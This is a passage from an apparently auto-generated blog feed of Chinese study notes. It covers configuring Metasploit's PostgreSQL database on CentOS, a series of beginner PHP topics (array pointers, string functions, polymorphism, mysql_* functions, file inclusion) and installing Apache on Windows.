5432</code><br>可以连接，进行下一步：<br></p><p>查找msf的数据库配置文件，并修改配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# find / -name database.yml.example</span><br><span class="line">/opt/metasploit/apps/pro/ui/config/database.yml.example</span><br><span class="line">/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml.example</span><br><span class="line">/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-credential-2.0.14/spec/dummy/config/database.yml.example</span><br><span class="line">/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit_data_models-2.0.17/spec/dummy/config/database.yml.example</span><br><span class="line">/opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-model-2.0.4/spec/dummy/config/database.yml.example</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# cp /opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml.example /opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# vi /opt/metasploit/apps/pro/vendor/bundle/ruby/2.6.0/gems/metasploit-framework-4.17.73/config/database.yml</span><br></pre></td></tr></table></figure><p>更改配置为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">development: &amp;pgsql</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  database: msf</span><br><span class="line">  username: msf</span><br><span class="line">  password: msf</span><br><span class="line">  host: localhost</span><br><span class="line">  port: 5432</span><br><span class="line">  pool: 200</span><br><span class="line">  timeout: 5</span><br></pre></td></tr></table></figure></p><p>完成配置，重启metasploit与postgresql 即可完成数据库配置<br><img src="centos安装msf/msf_db.png" alt="数据库状态"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;centos安装msf的一个笔记&quot;&gt;&lt;a href=&quot;#centos安装msf的一个笔记&quot; class=&quot;headerlink&quot; title=&quot;centos安装msf的一个笔记&quot;&gt;&lt;/a&gt;centos安装msf的一个笔记&lt;/h3&gt;&lt;p&gt;以前都是使用kali的msf
      
    
    </summary>
    
    
      <category term="环境安装" scheme="https://feng4.github.io/tags/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>php数组指针</title>
    <link href="https://feng4.github.io/2019/01/03/php%E6%95%B0%E7%BB%84%E6%8C%87%E9%92%88foreach/"/>
    <id>https://feng4.github.io/2019/01/03/php数组指针foreach/</id>
    <published>2019-01-03T06:19:05.589Z</published>
    <updated>2018-12-05T16:15:52.091Z</updated>
    
    <content type="html"><![CDATA[<h3 id="foreach数组指针"><a href="#foreach数组指针" class="headerlink" title="foreach数组指针"></a>foreach数组指针</h3><blockquote><p>1.指针其实也是一个变量，用来保存某个元素的地址。指针可以移动。<br>2.默认情况下，打开一个数组，指针会指向数组的第一个元素。<br><img src="https://i.imgur.com/EELmBAD.png" alt="1"><br>语法结构<code>foreach(数组 as 键=&gt;值){ 循环体 }</code></p></blockquote><blockquote><p>流程图</p></blockquote><p><img src="https://i.imgur.com/tjkkLID.png" alt="2"></p><blockquote><p>foreach是循环，break和continue也适用于foreach循环<br><img src="https://i.imgur.com/sAL4pfe.png" alt="3"></p></blockquote><blockquote><p>foreach值变量支持传地址<br><img src="https://i.imgur.com/thwPC7e.png" alt="4"><br><img src="https://i.imgur.com/VDWJHXh.png" alt="5"></p></blockquote><blockquote><p><strong>注意：</strong>键变量不支持传地址。</p></blockquote><blockquote><p>foreach循环变量数组的时候，遍历的是数组的拷贝<br><img src="https://i.imgur.com/LlP6QLr.png" alt="6"></p></blockquote><h3 id="数组指针的操作"><a href="#数组指针的操作" class="headerlink" title="数组指针的操作"></a>数组指针的操作</h3><blockquote><p>1.key() —— 从关联数组中取得键名，没有取到返回NULL。<br>2.current() – 返回数组中的当前单元<br>3.next() —– 返回数组中的当前单元<br>4.prev() —– 将数组的内部指针倒回一位<br>5.reset() —- 将数组的内部指针指向第一个单元<br>6.end() —— 将数组的内部指针指向最后一个单元</p></blockquote><p>例题：将数组的元素从后往前取<br><img src="https://i.imgur.com/aO0WLgM.png" alt="7"></p><blockquote><p><strong>注意：</strong>如果一个数组连续输出两次，必须要将指针复位。</p></blockquote><h3 id="each-函数的使用"><a href="#each-函数的使用" class="headerlink" title="each()函数的使用"></a>each()函数的使用</h3><blockquote><p>1.返回数组当前的键/值对并将数组指针向前移动一步，如果内部指针穿越了数组的末尾返回false</p></blockquote><blockquote><p>2.键值对返回4个单元，其中包含索引数组和关联数组，下标是key和0的是键，下标是1和value的是值。<br>3.each()=key()+current()+next()<br>4.如果第二次再遍历，必须通过reset()复位指针。<br><img src="https://i.imgur.com/c7o9hC1.png" alt="1"></p></blockquote><blockquote><p>通过while+each遍历数组<br><img src="https://i.imgur.com/7AFr5t8.png" alt="2"></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;foreach数组指针&quot;&gt;&lt;a href=&quot;#foreach数组指针&quot; class=&quot;headerlink&quot; title=&quot;foreach数组指针&quot;&gt;&lt;/a&gt;foreach数组指针&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;1.指针其实也是一个变量，用来保存某个元素
      
    
    </summary>
    
    
      <category term="php学习笔记" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>php字符串操作函数</title>
    <link href="https://feng4.github.io/2019/01/03/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C%E5%87%BD%E6%95%B0/"/>
    <id>https://feng4.github.io/2019/01/03/php字符串操作函数/</id>
    <published>2019-01-03T06:19:00.475Z</published>
    <updated>2018-12-08T02:49:47.528Z</updated>
    
    <content type="html"><![CDATA[<h3 id="用下标操作字符串"><a href="#用下标操作字符串" class="headerlink" title="[]用下标操作字符串"></a>[]用下标操作字符串</h3><blockquote><p>字符串可以理解成字符集合，所以可以通过[]来访问。<strong>不能操作中文</strong>。<br><img src="https://i.imgur.com/mepWNf1.png" alt="1"></p></blockquote><h3 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h3><blockquote><p>返回字符串长度，以字节为单位。<br><img src="https://i.imgur.com/RxPCzCv.png" alt="2"></p></blockquote><blockquote><p><strong>注意：在gbk下一个汉字2个字节，在utf-8下一个汉字3个字节。</strong></p></blockquote><h3 id="trim-、ltrim-、rtrim-去除空白字符"><a href="#trim-、ltrim-、rtrim-去除空白字符" class="headerlink" title="trim()、ltrim()、rtrim():去除空白字符"></a>trim()、ltrim()、rtrim():去除空白字符</h3><ol><li>trim():去字符串两边的把空格</li><li>ltrim():去字符串左边的空格</li><li>rtrim():去字符串右边的空格</li></ol><h3 id="strpos-strrpos"><a href="#strpos-strrpos" class="headerlink" title="strpos(),strrpos()"></a>strpos(),strrpos()</h3><blockquote><p>strpos():查找字符串首次出现的位置<br>strrpos(): 查找字符串最后一次出现的位置</p></blockquote><h3 id="str-repeat-重复字符串"><a href="#str-repeat-重复字符串" class="headerlink" title="str_repeat():重复字符串"></a>str_repeat():重复字符串</h3><p> <img src="https://i.imgur.com/rxhFV2A.png" alt="3"></p><h3 id="chr-和ord"><a href="#chr-和ord" class="headerlink" title="chr()和ord()"></a>chr()和ord()</h3><p><img src="https://i.imgur.com/Zu2hDLC.png" alt="4"></p><h3 id="substr-字符串-开始位置-截取长度-截取字符串"><a href="#substr-字符串-开始位置-截取长度-截取字符串" class="headerlink" title="substr(字符串,开始位置,截取长度):截取字符串"></a>substr(字符串,开始位置,截取长度):截取字符串</h3><p><img src="https://i.imgur.com/XxNCvt3.png" alt="5"></p><h3 id="strchr-、strrchr-：截取字符串"><a href="#strchr-、strrchr-：截取字符串" class="headerlink" title="strchr()、strrchr()：截取字符串"></a>strchr()、strrchr()：截取字符串</h3><p><img src="https://i.imgur.com/BVHZlRI.png" alt="6"></p><blockquote><p>应用：截取文件后缀名<br><img src="https://i.imgur.com/k365fZY.png" alt="7"></p></blockquote><h3 id="str-replace-替换字符串"><a href="#str-replace-替换字符串" class="headerlink" title="str_replace():替换字符串"></a>str_replace():替换字符串</h3><p><img src="https://i.imgur.com/5Lxr3sg.png" alt="8"></p><h3 id="str-split-将字符串分割成数组"><a href="#str-split-将字符串分割成数组" class="headerlink" title="str_split():将字符串分割成数组"></a>str_split():将字符串分割成数组</h3><p><img src="https://i.imgur.com/itHSqgW.png" alt="9"></p><h3 id="str-pad-带填充字符串-总位数-填充字符-填充位置-填充字符串"><a href="#str-pad-带填充字符串-总位数-填充字符-填充位置-填充字符串" class="headerlink" title="str_pad(带填充字符串,总位数,填充字符,填充位置):填充字符串"></a>str_pad(带填充字符串,总位数,填充字符,填充位置):填充字符串</h3><p><img src="https://i.imgur.com/iFDDFMm.png" alt="10"><br><img src="https://i.imgur.com/eInUsTU.png" alt="11"></p><h3 id="字符串大小写转换-strtolower-转换成小写、strtoupper-转换成大写"><a href="#字符串大小写转换-strtolower-转换成小写、strtoupper-转换成大写" class="headerlink" title="字符串大小写转换(strtolower():转换成小写、strtoupper():转换成大写)"></a>字符串大小写转换(strtolower():转换成小写、strtoupper():转换成大写)</h3><p><img src="https://i.imgur.com/deSwHjS.png" alt="12"></p><h3 id="nl2br-将字符串的换行转成"><a href="#nl2br-将字符串的换行转成" class="headerlink" title="nl2br():将字符串的换行转成"></a>nl2br():将字符串的换行转成<br></h3><p><img src="https://i.imgur.com/4Kk9xrO.png" alt="13"></p><h3 id="htmlspecialchars-将HTML字体转成实体"><a href="#htmlspecialchars-将HTML字体转成实体" class="headerlink" title="htmlspecialchars():将HTML字体转成实体"></a>htmlspecialchars():将HTML字体转成实体</h3><p><img src="https://i.imgur.com/xXGvgJU.png" alt="14"></p><h3 id="urlencode-、urldecode-url编码和解码"><a href="#urlencode-、urldecode-url编码和解码" class="headerlink" title="urlencode()、urldecode():url编码和解码"></a>urlencode()、urldecode():url编码和解码</h3><p><img src="https://i.imgur.com/41U3APm.png" alt="15"><br><img src="https://i.imgur.com/zWAyxKm.png" alt="16"></p><h3 id="多字节字符串处理函数"><a href="#多字节字符串处理函数" class="headerlink" title="多字节字符串处理函数"></a>多字节字符串处理函数</h3><blockquote><p>PHP默认本身不支持多字节处理。要开启扩展(multibytes)<br><img src="https://i.imgur.com/Bw6Hp5c.png" alt="17"><br>以mb_开头的函数都在多字节处理函数。</p></blockquote><h4 id="mb-strlen-获取字符串长度"><a href="#mb-strlen-获取字符串长度" class="headerlink" title="mb_strlen():获取字符串长度"></a>mb_strlen():获取字符串长度</h4><p><img src="https://i.imgur.com/nDtFGqk.png" alt="18"></p><blockquote><p><strong>注意</strong>：需要设置字符编码，默认字符编码为ISO-8859-1.</p></blockquote><h4 id="mb-internal-encoding-设置-获取内部字符编码"><a href="#mb-internal-encoding-设置-获取内部字符编码" class="headerlink" title="mb_internal_encoding():设置/获取内部字符编码"></a>mb_internal_encoding():设置/获取内部字符编码</h4><p><img src="https://i.imgur.com/djuADZd.png" alt="19"></p><h4 id="mb-strpos-查找字符串在另一个字符串的位置"><a href="#mb-strpos-查找字符串在另一个字符串的位置" class="headerlink" title="mb_strpos():查找字符串在另一个字符串的位置"></a>mb_strpos():查找字符串在另一个字符串的位置</h4><p><img src="https://i.imgur.com/lSTgnHf.png" alt="20"></p><h4 id="mb-substr-获取字符串"><a href="#mb-substr-获取字符串" class="headerlink" title="mb_substr():获取字符串"></a>mb_substr():获取字符串</h4><p><img src="https://i.imgur.com/co1UwGp.png" alt="21"></p><h3 id="字符串编码"><a href="#字符串编码" class="headerlink" title="字符串编码"></a>字符串编码</h3><h4 id="iconv-输入的编码-输出的编码-字符串"><a href="#iconv-输入的编码-输出的编码-字符串" class="headerlink" title="iconv(输入的编码,输出的编码,字符串)"></a>iconv(输入的编码,输出的编码,字符串)</h4><p><img src="https://i.imgur.com/euK8ciG.png" alt="22"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;用下标操作字符串&quot;&gt;&lt;a href=&quot;#用下标操作字符串&quot; class=&quot;headerlink&quot; title=&quot;[]用下标操作字符串&quot;&gt;&lt;/a&gt;[]用下标操作字符串&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;字符串可以理解成字符集合，所以可以通过[]来访问。&lt;str
      
    
    </summary>
    
    
      <category term="php学习笔记" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>php多态</title>
    <link href="https://feng4.github.io/2019/01/03/php%E5%A4%9A%E6%80%81/"/>
    <id>https://feng4.github.io/2019/01/03/php多态/</id>
    <published>2019-01-03T06:18:40.646Z</published>
    <updated>2018-12-31T15:05:34.117Z</updated>
    
    <content type="html"><![CDATA[<h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>面向对象的三大特性：<strong>封装、继承、多态。</strong><br>多态就是多种形态，多态分为方法重写和方法重载。<strong>但是PHP不支持方法重载</strong></p><h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p>子类重写了父类的同名的方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'你好啊！'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//方法重写</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我是学生！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Student;</span><br><span class="line">$a -&gt; show();<span class="comment">//这是学生类</span></span><br></pre></td></tr></table></figure></p><p>1、子类和父类的方法名必须一致<br>2、子类重写的方法可以和父类方法的参数个数不一致<br><img src="https://i.imgur.com/nM84Zmh.png" alt="1"></p><p>3、子类重写的方法可以和父类方法的参数个数不一致<br><img src="https://i.imgur.com/sHz4wJZ.png" alt="1"></p><h3 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h3><p>注意：php不支持方法重载<br><img src="https://i.imgur.com/Wr4Azpb.png" alt="2"></p><h4 id="私有属性的继承和重写"><a href="#私有属性的继承和重写" class="headerlink" title="私有属性的继承和重写"></a>私有属性的继承和重写</h4><p><img src="https://i.imgur.com/fNnBmzz.png" alt="3"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;多态&quot;&gt;&lt;a href=&quot;#多态&quot; class=&quot;headerlink&quot; title=&quot;多态&quot;&gt;&lt;/a&gt;多态&lt;/h2&gt;&lt;p&gt;面向对象的三大特性：&lt;strong&gt;封装、继承、多态。&lt;/strong&gt;&lt;br&gt;多态就是多种形态，多态分为方法重写和方法重载。&lt;strong
      
    
    </summary>
    
    
      <category term="php学习笔记" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>php操作mysql</title>
    <link href="https://feng4.github.io/2019/01/03/php%E6%93%8D%E4%BD%9Cmysql/"/>
    <id>https://feng4.github.io/2019/01/03/php操作mysql/</id>
    <published>2019-01-03T06:18:34.665Z</published>
    <updated>2018-12-09T14:42:29.816Z</updated>
    
    <content type="html"><![CDATA[<h3 id="php操作mysql"><a href="#php操作mysql" class="headerlink" title="php操作mysql"></a>php操作mysql</h3><blockquote><p>php本身不能操作mysql，但是php有扩展可以实现操作mysql。<br>php操作mysql的扩展：mysql，mysqli和PDO扩展。<br>mysql扩展：纯面向过程，里面都是函数，加载扩展后可以调用函数。<br>mysqli扩展：面向过程+面向对象，里面有函数也有类，加载扩展后可以选择调用函数或调用类操作<br>PDO:纯面向对象，只有类，加载后只能调用类。<br>mysql扩展在php5.5之后就移除了，小伙伴注意了。</p></blockquote><p>当php来对mysql进行操作之后：php的角色是mysql的一个客户端</p><blockquote><p>客户端操作服务端有必要的流程</p><ol><li>连接认证：数据库连接资源 <code>mysql_connect(服务器地址包含端口,用户名,用户密码);</code><br><img src="https://i.imgur.com/tVLwRC3.png" alt="5"><br>默认的：mysql_connect会产生一个连接资源，即便是重新连接，也会返回原有的连接资源<br><img src="https://i.imgur.com/4QZKQFM.png" alt="6"><br>如果真的想产生多一个连接：是新的可以在mysql_connect函数的第四个参数控制：true<br><img src="https://i.imgur.com/FAbpS2B.png" alt="7"></li><li>php发送sql指令（等待执行结果）</li><li>mysql服务端接收指令，执行指令，返回结果</li><li>php接收结果<br>mixed <code>mysql_query(sql指令);</code><br>  boolean结果;sql指令没有返回值，布尔true结果只能代表sql语句没有语法错误，false就代表是sql语句有语法错误：主增删改<br><img src="https://i.imgur.com/JvhvxbI.png" alt="8"><br>resource结果：结果集资源，sql指令有结果返回(show,select)，结果集永远为true，主查询<br><img src="https://i.imgur.com/MezXiWq.png" alt="9"><ol start="5"><li>php没有办法直接使用结果集：需要解析结果集mysql扩展提供了一系列函数：mysql_fetch系列：任何操作都是指针操作：操作完就会指针下移。<br><strong>mysql_fetch_array</strong>:默认获取混合数组，有一组关联，有一组索引。<br><img src="https://i.imgur.com/CQA8c5a.png" alt="10"><br>当前函数可以实现：只获取关联数组或者索引数组。通过第二个参数限制：MYSQL_BOTH是默认的，MYSQL_ASSOC是关联数组，MYSQL_NUM是索引数组。<br>关联数组获取：MYSQL_ASSOC<br><img src="https://i.imgur.com/YE993Qx.png" alt="11"><br>索引数组获取：MYSQL_NUM<br><img src="https://i.imgur.com/LA3ioR4.png" alt="12"><br><strong>mysql_fetch_row</strong>:获取索引数组<br><strong>mysql_fetch_assoc</strong>:直接获取关联数组<br>不管是哪个fetch：最终如果结果集指针移动到最后，返回都是false</li><li>如果指针已经移动到最后，那么需要重置指针实现其他操作。<br><code>mysql_data_seek(结果集资源，位置从0开始);</code></li><li>获取的数据往往只有一行：实际上查多少是为了显示全部：解析全部，循环遍历来实现。<br><img src="https://i.imgur.com/IzdFMq2.png" alt="13"></li><li>释放资源：mysql资源通常不需要释放(脚本执行周期不会太长，但是数据库的操作是贯穿整个脚本的)<br><code>mysql_close(资源变量);</code><br><img src="https://i.imgur.com/dabqZAm.png" alt="14"></li></ol></li></ol></blockquote><h4 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h4><blockquote><p>从计算机角度出发：增删改都属于写，查属于读。</p></blockquote><blockquote><p><strong>写操作</strong>:<br> 连接认证：不一定连接成功，需要对结果进行判断，可以直接使用三目运算(逻辑或)来进行处理，但是无法获取错误信息。<br> 如果要获取错误信息，那么需要使用mysql提供的获取错误的函数：<br> <code>mysql_errno()</code>:获取错误编号，<code>mysql_error()</code>:获取错误信息。<br> <img src="https://i.imgur.com/AWnMMtC.png" alt="15"></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;php操作mysql&quot;&gt;&lt;a href=&quot;#php操作mysql&quot; class=&quot;headerlink&quot; title=&quot;php操作mysql&quot;&gt;&lt;/a&gt;php操作mysql&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;php本身不能操作mysql，但是php有扩展可以
      
    
    </summary>
    
    
      <category term="php学习笔记" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>php包含文件</title>
    <link href="https://feng4.github.io/2019/01/03/php%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6/"/>
    <id>https://feng4.github.io/2019/01/03/php包含文件/</id>
    <published>2019-01-03T06:18:29.319Z</published>
    <updated>2018-12-05T15:59:43.779Z</updated>
    
    <content type="html"><![CDATA[<h2 id="php包含文件"><a href="#php包含文件" class="headerlink" title="php包含文件"></a>php包含文件</h2><blockquote><p>在网站中有相同的banner，版权等等页面，我们可以将相同的页面做成包含文件，在展示的页面中包含即可。<br> 包含文件相当于将文件的内容复制到页面中，如果包含文件有<html></html>,包含后，页面中就不止一个页面结构了。这与W3C定义的规范不符合，所以在包含文件中不能出现页面的结构。</p></blockquote><h3 id="包含文件的语法"><a href="#包含文件的语法" class="headerlink" title="包含文件的语法"></a>包含文件的语法</h3><blockquote><p>1.include() ——— 可以包含多次<br>2.require() ——— 可以包含多次<br>3.include_once() —- 只能包含一次<br>4.require_once() —- 只能包含一次</p></blockquote><h3 id="require和include的区别"><a href="#require和include的区别" class="headerlink" title="require和include的区别"></a>require和include的区别</h3><blockquote><p>相同点：可以包含多次<br>不同点：require遇到错误停止执行，include遇到错误继续执行。<br><img src="https://i.imgur.com/tMrMqO5.png" alt="1"></p></blockquote><h3 id="目录-文件和目录-文件的区别"><a href="#目录-文件和目录-文件的区别" class="headerlink" title="./目录/文件和目录/文件的区别"></a>./目录/文件和目录/文件的区别</h3><blockquote><p>这两种写法的效果基本是一样的，不带./的路径受到include_path配置的影响。<br><img src="https://i.imgur.com/i5FsYiL.png" alt="2"><br><img src="https://i.imgur.com/AKgTvUO.png" alt="3"></p></blockquote><blockquote><p>可以通过<code>set_include_path()</code>来设置包含文件所在的目录。<br><img src="https://i.imgur.com/X8JaM66.png" alt="4"><br><code>set_include_path()</code> —- 设置包含文件的目录<br><code>get_include_path()</code> —- 获取包含文件的目录<br><strong>设置include_path的作用：</strong><br>1、将项目的经常使用的文件放到一个统一的目录下，然后通过include_path指向此文件夹，就不用写很长的地址字符串。<br>2.将安全性高的文件放到站点外，通过include_path指向此目录。比如连接数据库文件。</p></blockquote><h3 id="终止脚本执行"><a href="#终止脚本执行" class="headerlink" title="终止脚本执行"></a>终止脚本执行</h3><blockquote><p><strong>exit和die()</strong>:<br>exit，终止脚本执行，die(),终止后可以输出一个字符串。<br><img src="https://i.imgur.com/0cmG3P8.png" alt="5"><br><img src="https://i.imgur.com/Hsg7dEP.png" alt="7"><br><strong>return</strong>:<br>终止当前页面的执行。<br><img src="https://i.imgur.com/GPdKQjq.png" alt="6"><br><img src="https://i.imgur.com/2iD0bS4.png" alt="8"></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;php包含文件&quot;&gt;&lt;a href=&quot;#php包含文件&quot; class=&quot;headerlink&quot; title=&quot;php包含文件&quot;&gt;&lt;/a&gt;php包含文件&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在网站中有相同的banner，版权等等页面，我们可以将相同的页面做成包含文
      
    
    </summary>
    
    
      <category term="php学习笔记" scheme="https://feng4.github.io/tags/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Apache的下载与安装</title>
    <link href="https://feng4.github.io/2019/01/03/Apache%E7%9A%84%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85/"/>
    <id>https://feng4.github.io/2019/01/03/Apache的下载与安装/</id>
    <published>2019-01-03T06:18:20.672Z</published>
    <updated>2018-12-05T16:12:54.874Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、Apache官网下载Apache-HTTP-Server服务器"><a href="#一、Apache官网下载Apache-HTTP-Server服务器" class="headerlink" title="一、Apache官网下载Apache HTTP Server服务器"></a>一、Apache官网下载Apache HTTP Server服务器</h3><blockquote><p>1.打开Apache官网：<a href="http://www.apache.org" title="Apache" target="_blank" rel="noopener">http://www.apache.org</a><br><img src="https://i.imgur.com/LgZMLaT.jpg" alt="1"><br><img src="https://i.imgur.com/95pMCMe.jpg" alt="2"><br><img src="https://i.imgur.com/GTOWpIl.jpg" alt="3"><br><img src="https://i.imgur.com/0Joc0hz.jpg" alt="4"><br><img src="https://i.imgur.com/iBRDw1K.jpg" alt="5"><br>选择第一项ApacheHaus，这是个第三方下载平台，在它的网站下载独立的Apache会是一个压缩包。另外四个中，第二个也是独立的Apache下载地址，另外三个是集成开发环境。本人选的第一个。<br><img src="https://i.imgur.com/Q1LIsaw.jpg" alt="6"><br>在新的界面中，会发现VC9和VC11字样，通过阅读相关内容得知，VC9是指用VS2008编译的代码，而VC11是用VS2012编译的，而用VS2012编译的无法在Windows XP和Server 2003中使用。算是为了兼容性好点吧，本人选的用VC9编译的32位Apache，选择下载至此，下载过程完成！<br><img src="https://i.imgur.com/ad6jdMZ.jpg" alt="7"></p></blockquote><h3 id="二、Apache服务器的安装"><a href="#二、Apache服务器的安装" class="headerlink" title="二、Apache服务器的安装"></a>二、Apache服务器的安装</h3><blockquote><p>Apache下载完成后，进行解压缩。</p></blockquote><blockquote><p>解压文件放到一个文件夹，我放到c:\wamp文件夹下。<br>解压后文件夹名我设置为Apache。</p></blockquote><h3 id="三、Apache的配置"><a href="#三、Apache的配置" class="headerlink" title="三、Apache的配置"></a>三、Apache的配置</h3><blockquote><p>打开httpd.conf文件（在conf文件夹下）<br>1.修改目录位置，如下图：<br><img src="https://i.imgur.com/3uAOAVD.png" alt="8"></p></blockquote><blockquote><p>若你的80端口被占用（可以在cmd下用命令netstat -a查看），可以把默认apache端口改掉<br><img src="https://i.imgur.com/B4jpAIy.png" alt="9"></p></blockquote><blockquote><p>2.配置安装Apache的主服务，这样Apache才能启动。以<strong>管理员身份</strong>打开cmd窗口，到apache的bin目录下，输入：<code>httpd.exe -k install -n apache</code>。这条命令是安装apache服务，并将该服务名命名为apache（你也可以改为你喜欢的名称）。<br><img src="https://i.imgur.com/rpjfdFx.png" alt="10"><br>其中，Errors reported here must be corrected before the service can be started.意思是，此处报告的错误必须在服务开始前进行纠正。若没有，则成功。</p></blockquote><h3 id="四、Apache服务器的启动"><a href="#四、Apache服务器的启动" class="headerlink" title="四、Apache服务器的启动"></a>四、Apache服务器的启动</h3><blockquote><p>配置好Apache服务器之后，就可以启动服务器，windows下Apache服务器的启动：</p></blockquote><blockquote><p>1.利用命令启动<br><img src="https://i.imgur.com/eaILgnp.png" alt="11"><br>注意：这里如果你的服务名有改动的话，就需要指定服务名。-n是指定服务名。</p></blockquote><blockquote><p>2.利用Apache服务器自身的程序打开：<br>在bin目录下的ApacheMonitor.exe,打开<br><img src="https://i.imgur.com/Nei1TVq.png" alt="12"></p></blockquote><blockquote><p>打开浏览器，输入<a href="http://localhost,若出现如下图的界面，则Apache服务器的基本配置完毕。" target="_blank" rel="noopener">http://localhost,若出现如下图的界面，则Apache服务器的基本配置完毕。</a><br><img src="https://i.imgur.com/xRGCBNt.png" alt="13"></p></blockquote><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><blockquote><p>我的电脑右键属性<br><img src="https://i.imgur.com/KGhfjR6.png" alt="14"><br><img src="https://i.imgur.com/qKaQmis.png" alt="15"><br>将apache的bin目录放到path中，用”;”分隔。<br><img src="https://i.imgur.com/dqhobZd.png" alt="16"><br>执行过程：当在命令行输入一个命令的时候，先到当前目录下查找当前命令，如果有就执行，如果没有就到环境变量中找path路径，path中有很多命令的路径，默认在从左往右依次寻找。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、Apache官网下载Apache-HTTP-Server服务器&quot;&gt;&lt;a href=&quot;#一、Apache官网下载Apache-HTTP-Server服务器&quot; class=&quot;headerlink&quot; title=&quot;一、Apache官网下载Apache HTTP Se
      
    
    </summary>
    
    
      <category term="PHP" scheme="https://feng4.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>mysql高级操作</title>
    <link href="https://feng4.github.io/2018/12/29/mysql%E9%AB%98%E7%BA%A7%E6%93%8D%E4%BD%9C/"/>
    <id>https://feng4.github.io/2018/12/29/mysql高级操作/</id>
    <published>2018-12-29T14:33:33.159Z</published>
    <updated>2018-12-12T07:27:57.196Z</updated>
    
